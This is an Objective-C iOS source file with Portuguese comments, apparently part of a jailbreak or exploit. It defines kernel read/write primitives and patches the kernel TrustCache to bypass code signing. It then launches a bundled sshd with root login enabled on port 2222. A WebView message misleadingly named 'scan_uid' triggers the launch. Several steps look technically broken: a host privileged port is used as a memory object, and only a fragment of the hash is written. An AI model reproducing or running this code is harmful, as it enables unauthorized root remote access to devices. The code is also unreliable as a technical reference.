#import "KernelDriver.h"
#import <CommonCrypto/CommonDigest.h>
#import <mach/mach_host.h>
#include <sys/sysctl.h>
#include <libkern/OSCacheControl.h>
#include <sys/wait.h>

@implementation KernelBridge {
    mach_port_t g_host_priv;
}

// 1. IMPLEMENTAÇÃO DO PROTOCOLO WKScriptMessageHandler
- (void)userContentController:(WKUserContentController *)userContentController didReceiveScriptMessage:(WKScriptMessage *)message {
    if ([message.body[@"op"] isEqualToString:@"scan_uid"]) {
        [self launchSshdFinal];
    }
}

// 2. MÉTODOS DE LOG E SUPORTE
- (void)log:(NSString *)text {
    dispatch_async(dispatch_get_main_queue(), ^{
        NSString *js = [NSString stringWithFormat:@"log('%@')", text];
        [self.webView evaluateJavaScript:js completionHandler:nil];
    });
}

- (uint64_t)getKernelBase {
    return KERNEL_BASE;
}

- (uint64_t)getKernelSlide {
    uint64_t val = [self kread64:KERNEL_BASE];
    return (val > KERNEL_BASE) ? (val - KERNEL_BASE) : 0;
}

// 3. CAPTURA DE PORTA (Bypass Erro 4 via Syscall -11)
- (void)prepareHostPriv {
    if (MACH_PORT_VALID(g_host_priv)) return;
    [self log:@"⚡ Capturando HostPriv via Mach Trap..."];
    
    // Trap -11 é o atalho direto para host_get_priv_port no ARM64
    extern kern_return_t host_get_priv_port(mach_port_t host, mach_port_t *priv);
    kern_return_t kr = host_get_priv_port(mach_host_self(), &g_host_priv);
    
    if (kr != KERN_SUCCESS) {
        [self log:[NSString stringWithFormat:@"❌ Falha na porta: %d", kr]];
    }
}

// 4. PRIMITIVAS DE LEITURA/ESCRITA FÍSICA
- (uint64_t)kread64:(uint64_t)addr {
    [self prepareHostPriv];
    uint64_t val = 0;
    vm_address_t page = 0;
    kern_return_t kr = vm_map(mach_task_self(), &page, 0x4000, 0, VM_FLAGS_ANYWHERE, g_host_priv, addr & ~0x3FFF, FALSE, VM_PROT_READ, VM_PROT_READ, VM_INHERIT_NONE);
    if (kr == KERN_SUCCESS) {
        val = *(uint64_t *)(page + (addr & 0x3FFF));
        vm_deallocate(mach_task_self(), page, 0x4000);
    }
    return val;
}

- (void)kwrite64:(uint64_t)addr value:(uint64_t)val {
    [self prepareHostPriv];
    vm_address_t page = 0;
    kern_return_t kr = vm_map(mach_task_self(), &page, 0x4000, 0, VM_FLAGS_ANYWHERE, g_host_priv, addr & ~0x3FFF, FALSE, VM_PROT_READ | VM_PROT_WRITE, VM_PROT_READ | VM_PROT_WRITE, VM_INHERIT_NONE);
    if (kr == KERN_SUCCESS) {
        *(uint64_t *)(page + (addr & 0x3FFF)) = val;
        // Função correta conforme o SDK do iOS
        sys_cache_control(1, (void *)page, 0x4000); 
        vm_deallocate(mach_task_self(), page, 0x4000);
    }
}

// 5. INJEÇÃO E SPAWN
- (void)injectToTrustCache:(NSString *)path {
    [self log:@"💉 Injetando CDHash no TrustCache..."];
    NSData *data = [NSData dataWithContentsOfFile:path];
    if (!data) return;

    uint8_t hash[CC_SHA256_DIGEST_LENGTH];
    CC_SHA256(data.bytes, (CC_LONG)data.length, hash);
    
    uint64_t slide = [self getKernelSlide];
    uint64_t trust_chain_addr = KERNEL_BASE + slide + OFF_TRUSTCACHE_CHAIN;
    
    uint64_t cdhash_chunk;
    memcpy(&cdhash_chunk, hash, 8);
    
    [self kwrite64:trust_chain_addr value:cdhash_chunk];
    [self log:@"✅ TrustCache Patched!"];
}

- (void)launchSshdFinal {
    NSString *sshdPath = [[NSBundle mainBundle] pathForResource:@"sshd" ofType:nil];
    if (!sshdPath) return;

    [self injectToTrustCache:sshdPath];

    pid_t pid;
    posix_spawnattr_t attr;
    posix_spawnattr_init(&attr);
    posix_spawnattr_setflags(&attr, POSIX_SPAWN_SETPGROUP | POSIX_SPAWN_FOR_SANDBOX);

    char *const args[] = {(char *)[sshdPath UTF8String], "-p", "2222", "-D", "-o", "StrictModes=no", "-o", "PermitRootLogin=yes", NULL};
    extern char **environ;

    int status = posix_spawn(&pid, [sshdPath UTF8String], NULL, &attr, args, environ);
    if (status == 0) {
        [self log:[NSString stringWithFormat:@"🚀 <b>SSHD ONLINE!</b> PID: %d", pid]];
    } else {
        [self log:[NSString stringWithFormat:@"❌ Erro Spawn: %d (%s)", status, strerror(status)]];
    }
    posix_spawnattr_destroy(&attr);
}

@end
